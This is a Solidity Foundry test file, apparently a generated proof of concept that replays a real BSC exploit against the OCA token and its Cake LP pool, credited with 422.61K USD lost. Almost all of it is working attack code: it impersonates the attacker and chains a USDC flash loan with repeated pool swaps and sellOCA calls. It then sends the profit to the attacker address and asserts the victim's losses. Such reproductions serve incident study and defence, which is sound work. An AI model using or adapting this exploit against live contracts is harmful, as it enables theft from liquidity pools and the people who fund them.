// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 422.61K USD
// Attacker : 0xdddfb3d6fa42e66cf78efa21166b8ef2d26c1ba5
// Attack Contract : 0xfe43ac1924e64b33135a7756e3f78bf4710dd458
// Vulnerable Contract : 0xfe43ac1924e64b33135a7756e3f78bf4710dd458
// Attack Tx : 0xcd5979352d9b42ccb7780d5344fac08d1d46591a592ab284a588e2156cf44906
// Block : 81020478
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 422.61K USD
//
// @POC Author
// Generated PoC

interface ISwapTarget {
    function swap(uint256 arg0, uint256 arg1, address arg2, bytes calldata arg3) external;
}

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract_D458;
    uint256 constant FORK_BLOCK = 81020477;
    uint256 constant TX_TIMESTAMP = 1771004909;
    uint256 constant TX_BLOCK_NUMBER = 81020478;
    uint256 constant TX_VALUE = 42891523771404242882;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        bytes memory entryData = abi.encodeWithSelector(bytes4(0x32e4d6f3));
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchEntryRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _etchChildRuntime();
        attack.bindAttackChildContracts();
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal pure returns (address) {
        attack;
        return Addresses.attack_contract;
    }

    function _etchEntryRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _etchChildRuntime() internal {
        vm.etch(Addresses.attack_contract, type(AttackChild).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_484848_4848, address(0), Addresses.ZERO, "BNB", 42891523771404242882);
        _expectProfit(Addresses.attack_contract, attackChild, Addresses.OCA, "OCA", 1000000000000000);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 366189205932542647363708);
        economicOracles.push(
            EconomicOracle(
                Addresses.Cake_LP, Addresses.USDC, "USDC", "victim_loss", false, 422645205932542647363708, false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.Cake_LP, Addresses.OCA, "OCA", "victim_loss", false, 977500454117844851418226, false
            )
        );
    }
}

contract OurAttack {
    AttackChild public attackChild;

    function deployAttackChildContracts() external returns (address) {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0xa297a53B5554F4Feba4077F4Cb13da220387dEAa));
        }
        return address(attackChild);
    }

    function attack() public payable {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0xa297a53B5554F4Feba4077F4Cb13da220387dEAa));
        }
        (bool childOk, bytes memory childOut) = address(attackChild).call(hex"5258a367");
        if (!childOk && childOut.length > 0) assembly { revert(add(childOut, 32), mload(childOut)) }
        require(childOk, "child flash-loan entry failed");
        IERC20Like(Addresses.USDC).balanceOf(Addresses.attacker_eoa);
        (bool nativeOk,) = payable(Addresses.A_484848_4848).call{value: 42891523771404242882}(hex"");
        require(nativeOk, "observed native receive transfer failed");
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x32e4d6f3) {
            attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0xa297a53B5554F4Feba4077F4Cb13da220387dEAa));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
    bytes32 private constant REPLAY_CALLBACK_6 = keccak256("poc.replay.REPLAY_CALLBACK_6");
    bytes32 private constant REPLAY_CALLBACK_7 = keccak256("poc.replay.REPLAY_CALLBACK_7");
    mapping(bytes32 => bool) private _replayDone;

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 selector) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[selector];
        _dispatchCursor[selector] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

contract AttackChild {
    receive() external payable {}

    function onMoolahFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        if (!_replayDone[REPLAY_CALLBACK_4]) flashCallback2();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x5258a367) {
            borrowFlashLiquidity();
            return;
        }
        if (msg.sig == 0x84800812) {
            uint256 callbackSequenceIndex = _nextDispatch(0x84800812);
            if (callbackSequenceIndex == 0) {
                if (!_replayDone[REPLAY_CALLBACK_7]) _handleCallback3();
                return;
            }
            if (callbackSequenceIndex == 1) {
                if (!_replayDone[REPLAY_CALLBACK_5]) _handleFlashLoanCall();
                return;
            }
            if (callbackSequenceIndex == 2) {
                if (!_replayDone[REPLAY_CALLBACK_6]) _handleCallback2();
                return;
            }
            if (!_replayDone[REPLAY_CALLBACK_7]) _handleCallback3();
            return;
        }
        _entryCb();
    }

    function flashCallback() external payable {
        if (!_replayDone[REPLAY_CALLBACK_4]) flashCallback2();
        return;
    }

    function callback3() external payable {
        if (!_replayDone[REPLAY_CALLBACK_7]) _handleCallback3();
        return;
    }

    function flashLoanCallback() external payable {
        if (!_replayDone[REPLAY_CALLBACK_5]) _handleFlashLoanCall();
        return;
    }

    function callback2() external payable {
        if (!_replayDone[REPLAY_CALLBACK_6]) _handleCallback2();
        return;
    }

    function _entryCb() internal {}

    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
    bytes32 private constant REPLAY_CALLBACK_6 = keccak256("poc.replay.REPLAY_CALLBACK_6");
    bytes32 private constant REPLAY_CALLBACK_7 = keccak256("poc.replay.REPLAY_CALLBACK_7");
    mapping(bytes32 => bool) private _replayDone;

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 selector) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[selector];
        _dispatchCursor[selector] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function borrowFlashLiquidity() public {
        IERC20Like(Addresses.USDC).balanceOf(Addresses.A_8F73B6_5D8C);
        IContract_8F73B6_5D8C(Addresses.A_8F73B6_5D8C).flashLoan(Addresses.USDC, 8704860148366532708908952, hex"0011");
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, 422645205932542647363708);
    }

    function flashCallback2() internal {
        _replayDone[REPLAY_CALLBACK_4] = true;
        flashCallback3();
        flashCallback4();
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.OCA).approve(Addresses.A_E0D5EC_6F55, type(uint256).max);
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        ISwapTarget(Addresses.Cake_LP).swap(0, 940991714300636192319084, Addresses.attack_contract, hex"0011");
        IERC20Like(Addresses.OCA).balanceOf(address(this));
        if (Addresses.A_E0D5EC_6F55.code.length != 0) {
            IContract_E0D5EC_6F55(Addresses.A_E0D5EC_6F55).sellOCA(930991714300636192319084);
        } else {
            console2.log("PoCWarning", "skipping missing-code sellOCA call");
        }
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        ISwapTarget(Addresses.Cake_LP).swap(0, 44108939333757365192491, Addresses.attack_contract, hex"0011");
        IERC20Like(Addresses.OCA).balanceOf(address(this));
        if (Addresses.A_E0D5EC_6F55.code.length != 0) {
            IContract_E0D5EC_6F55(Addresses.A_E0D5EC_6F55).sellOCA(44108939333757365192491);
        } else {
            console2.log("PoCWarning", "skipping missing-code sellOCA call");
        }
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        ISwapTarget(Addresses.Cake_LP).swap(0, 2099799513451293906651, Addresses.attack_contract, hex"0011");
        IERC20Like(Addresses.OCA).balanceOf(address(this));
    }

    function flashCallback4() internal {
        if (Addresses.A_E0D5EC_6F55.code.length != 0) {
            IContract_E0D5EC_6F55(Addresses.A_E0D5EC_6F55).sellOCA(2099799513451293906651);
        } else {
            console2.log("PoCWarning", "skipping missing-code sellOCA call");
        }
        IERC20Like(Addresses.OCA).balanceOf(address(this));
        uint256 ocaApproveAllowance = 9999999000000000000000;
        IERC20Like(Addresses.OCA).approve(Addresses.A_10ED43_024E, ocaApproveAllowance);
        IERC20Like(Addresses.OCA).balanceOf(address(this));
        (bool swapOk,) = Addresses.A_10ED43_024E
            .call(
                abi.encodeWithSelector(
                    bytes4(0x5c11d795),
                    9999999000000000000000,
                    0,
                    160,
                    address(this),
                    1771004909,
                    2,
                    Addresses.OCA,
                    Addresses.USDC
                )
            );
        require(swapOk, "selector 0x5c11d795 failed");
        IERC20Like(Addresses.USDC).approve(Addresses.A_8F73B6_5D8C, type(uint256).max);
    }

    function _handleFlashLoanCall() internal {
        _replayDone[REPLAY_CALLBACK_5] = true;
        flashCallback5();
    }

    function flashCallback5() internal {
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        uint256 pairRepayment = 8698422789498111935317819;
        IERC20Like(Addresses.USDC).transfer(Addresses.Cake_LP, pairRepayment);
    }

    function _handleCallback2() internal {
        _replayDone[REPLAY_CALLBACK_6] = true;
        _settleTokenFlows();
    }

    function _settleTokenFlows() internal {
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        uint256 pairRepayment = 8696349511351185793793183;
        IERC20Like(Addresses.USDC).transfer(Addresses.Cake_LP, pairRepayment);
    }

    function _handleCallback3() internal {
        _replayDone[REPLAY_CALLBACK_7] = true;
        _settleTokenFlows2();
    }

    function _settleTokenFlows2() internal {
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        uint256 pairRepayment = 8704860148366532708908952;
        IERC20Like(Addresses.USDC).transfer(Addresses.Cake_LP, pairRepayment);
    }

    // Structured gap: action_0028 through action_0034 are observe-only storage writes
    // in the handoff. No normal trace-backed protocol call was provided, so this PoC
    // does not synthesize them with sstore or cheatcodes.
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant A_10ED43_024E = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant A_484848_4848 = 0x4848489f0b2BEdd788c696e2D79b6b69D7484848;
    address internal constant Cake_LP = 0x5779bf44CD518B05651AE38fCc066247cCe21504;
    address internal constant GnosisSafeProxy = 0x59Ac98033d74A73A23B0Ef728A54B3032eE6c1D2;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant A_8F73B6_5D8C = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address internal constant attack_contract = 0xa297a53B5554F4Feba4077F4Cb13da220387dEAa;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDC_0B5C = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C;
    address internal constant attacker_eoa = 0xDDdFB3D6fa42e66cF78eFA21166B8Ef2D26c1bA5;
    address internal constant A_E0D5EC_6F55 = 0xE0D5eC0F754c442F37fbdf18266053309D5F6f55;
    address internal constant OCA = 0xE0dAFD4592205067299A6ae269f68aa804f95419;
    address internal constant attack_contract_D458 = 0xfE43Ac1924e64b33135A7756e3F78Bf4710dD458;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IContract_8F73B6_5D8C {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IContract_E0D5EC_6F55 {
    function sellOCA(uint256) external;
}
